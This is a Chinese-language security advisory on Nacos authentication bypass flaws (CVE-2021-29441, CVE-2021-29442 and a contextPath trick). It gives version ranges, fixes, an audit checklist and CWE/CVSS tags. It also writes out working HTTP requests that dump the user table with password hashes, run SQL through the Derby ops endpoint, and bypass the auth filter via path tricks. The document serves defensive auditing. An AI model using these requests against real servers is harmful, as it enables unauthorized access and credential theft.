# Nacos 认证绕过漏洞

## CVE-2021-29441 — User-Agent Nacos-Server 绕过

### 影响版本

Nacos ≤ 1.4.1

### 触发条件

`nacos.core.auth.enabled=true`（开启鉴权），但 `serverIps` 校验存在缺陷。

### 攻击方式

Nacos 内部用 `User-Agent: Nacos-Server` 标识集群节点间通信，用于跳过鉴权。
未升级版本任何请求带此 UA 即被视为服务器节点：

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

响应直接返回全部用户表（含密码 hash）。

### 修复

- 升级 Nacos ≥ 1.4.2 / 2.0.0-ALPHA.1
- 或配置 `nacos.core.auth.enable.userAgentAuthWhite=false`（1.4.1 起可用）
- 或在反代层剥离外部请求的 `User-Agent: Nacos-Server`

## CVE-2021-29442 — 未授权命名空间操作

### 触发条件

`/nacos/v1/cs/ops/derby` 等运维接口未鉴权，可执行任意 SQL：

```http
GET /nacos/v1/cs/ops/derby?sql=select+*+from+users HTTP/1.1
```

内嵌 Derby 数据库场景直接拖库。

### 修复

- 升级 Nacos ≥ 1.4.2
- 反代层禁用 `/nacos/v1/cs/ops/*` 外部访问

## contextPath 认证绕过

Nacos 早期版本认证过滤器基于 URI 前缀匹配。若 `server.servlet.context-path=/nacos`
被绕过或双写：

```
GET /nacos/nacos/v1/auth/users
GET /nacos/../nacos/v1/auth/users
GET /Nacos/v1/auth/users        # 大小写
```

某些 Servlet 容器 URI 规范化后仍能命中路由，但过滤器已放行。

### 修复

- 使用标准反向代理规范化路径
- 升级到修复版本

## 审计动作

- [ ] `nacos.core.auth.enabled=true`
- [ ] `nacos.core.auth.enable.userAgentAuthWhite=false`
- [ ] `nacos.core.auth.server.identity.key` / `identity.value` 是否修改
- [ ] 版本 ≥ 2.2.3（多个 CVE 修复窗口）
- [ ] 反向代理是否剥离 `User-Agent: Nacos-Server`
- [ ] `/nacos/v1/cs/ops/**` 是否禁止外部访问

## 相关规则

- CWE: CWE-287 (Improper Authentication)
- CWE: CWE-306 (Missing Authentication)
- 内建 pattern: `nacos_misconfig`
- CVSS: 9.8
